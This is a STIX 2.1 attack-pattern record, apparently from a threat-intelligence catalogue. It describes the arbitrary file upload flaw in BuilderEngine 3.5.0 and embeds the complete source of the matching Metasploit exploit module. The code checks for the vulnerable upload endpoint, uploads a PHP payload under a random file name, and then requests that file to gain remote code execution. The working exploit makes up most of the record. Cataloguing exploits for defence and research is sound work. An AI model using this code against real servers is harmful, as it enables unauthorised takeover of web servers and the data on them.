{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--742669ae-d5c1-4016-be22-3687abf81dc7",
    "created": "2024-08-14T17:07:32.138913Z",
    "modified": "2024-08-14T17:07:32.138917Z",
    "name": "\"BuilderEngine Arbitrary File Upload Vulnerability and execution\"",
    "description": " This module exploits a vulnerability found in BuilderEngine 3.5.0 via elFinder 2.0. The jquery-file-upload plugin can be abused to upload a malicious file, which would result in arbitrary remote code execution under the context of the web server.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/builderengine_upload_exec.rb",
            "external_id": "builderengine_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"BuilderEngine Arbitrary File Upload Vulnerability and execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in BuilderEngine 3.5.0\n        via elFinder 2.0. The jquery-file-upload plugin can be abused to upload a malicious\n        file, which would result in arbitrary remote code execution under the context of\n        the web server.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'metanubix',   # PoC\n          'Marco Rivoli' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['EDB', '40390']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['BuilderEngine 3.5.0', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2016-09-18',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to BuilderEngine', '/'])\n        ])\n  end\n\n  def check\n    uri = target_uri.path\n    uri << '/' if uri[-1,1] != '/'\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'themes/dashboard/assets/plugins/jquery-file-upload/server/php/')\n    })\n\n    if res && res.code == 200 && !res.body.blank?\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    uri = target_uri.path\n\n    peer = \"#{rhost}:#{rport}\"\n    php_pagename = rand_text_alpha(8 + rand(8)) + '.php'\n    data = Rex::MIME::Message.new\n    payload_encoded = Rex::Text.rand_text_alpha(1)\n    payload_encoded << \"<?php \"\n    payload_encoded << payload.encoded\n    payload_encoded << \" ?>\\r\\n\"\n    data.add_part(payload_encoded, 'application/octet-stream', nil, \"form-data; name=\\\"files[]\\\"; filename=\\\"#{php_pagename}\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(uri,'themes/dashboard/assets/plugins/jquery-file-upload/server/php/'),\n      'method' => 'POST',\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => post_data\n    })\n\n    if res\n      if res.code == 200 && res.body =~ /files|#{php_pagename}/\n        print_good(\"Our payload is at: #{php_pagename}. Calling payload...\")\n        register_file_for_cleanup(php_pagename)\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to deploy payload, server returned #{res.code}\")\n      end\n    else\n      fail_with(Failure::Unknown, 'ERROR')\n    end\n\n    print_status(\"Calling payload...\")\n    send_request_cgi(\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri,'files/', php_pagename)\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-09-18",
    "x_mitre_platforms": [
        "['php']"
    ]
}